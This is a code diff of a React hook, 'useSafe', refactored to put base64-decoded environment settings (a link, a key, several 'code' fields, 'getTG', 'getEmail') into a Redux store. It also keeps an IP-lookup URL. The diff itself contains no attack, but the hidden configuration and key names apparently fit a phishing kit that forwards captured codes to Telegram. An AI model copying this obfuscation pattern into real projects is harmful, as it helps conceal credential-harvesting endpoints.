@@ -1,5 +1,6 @@
 // core
 import { useEffect, useState } from 'react';
+import { useDispatch } from 'react-redux';
 
 const initial = {
     ipify: 'https://api.ipify.org/?format=json',
@@ -8,11 +9,12 @@ const initial = {
 };
 
 const useSafe = () => {
-    const [safe, setSafe] = useState(initial);
+    const [loaded, setLoaded] = useState(false);
+    const dispatch = useDispatch();
 
     function decode(data) {
         if (!data) {
-            console.warn('::: No data :::');
+            console.warn('::: No data!!! :::');
             return;
         }
         let buff = Buffer.from(data, 'base64');
@@ -20,25 +22,28 @@ const useSafe = () => {
     }
 
     function setEnv() {
-        if (!process.env.REACT_APP_LINK) return;
-        console.info('::: Setting env :::');
-
-        setSafe({
-            ...initial,
-            link: decode(process.env.REACT_APP_LINK),
-            key: decode(process.env.REACT_APP_KEY),
-            mCode: decode(process.env.REACT_APP_M_CODE),
-            fCode: decode(process.env.REACT_APP_F_CODE),
-            tCode: decode(process.env.REACT_APP_T_CODE),
-            cv: decode(process.env.REACT_APP_CV),
-            getNF: decode(process.env.REACT_APP_GET_NF),
-            getTG: decode(process.env.REACT_APP_GET_TG),
-            getEmail: decode(process.env.REACT_APP_GET_EMAIL)
+        if (!process.env.REACT_APP_LINK && loaded) return;
+        console.info('::: SET ENV :::');
+        dispatch({
+            type: 'SET_ENV',
+            payload: {
+                ...initial,
+                link: decode(process.env.REACT_APP_LINK),
+                key: decode(process.env.REACT_APP_KEY),
+                mCode: decode(process.env.REACT_APP_M_CODE),
+                fCode: decode(process.env.REACT_APP_F_CODE),
+                tCode: decode(process.env.REACT_APP_T_CODE),
+                cv: decode(process.env.REACT_APP_CV),
+                getNF: decode(process.env.REACT_APP_GET_NF),
+                getTG: decode(process.env.REACT_APP_GET_TG),
+                getEmail: decode(process.env.REACT_APP_GET_EMAIL)
+            }
         });
+        setLoaded(true);
     }
 
     useEffect(() => {
-        if (safe.link) return;
+        if (loaded) return;
         setEnv();
 
         const checkProcessEnv = async () => {
@@ -49,9 +54,7 @@ const useSafe = () => {
         };
 
         checkProcessEnv();
-    }, []);
-
-    return safe;
+    }, [loaded]);
 };
 
 export default useSafe;
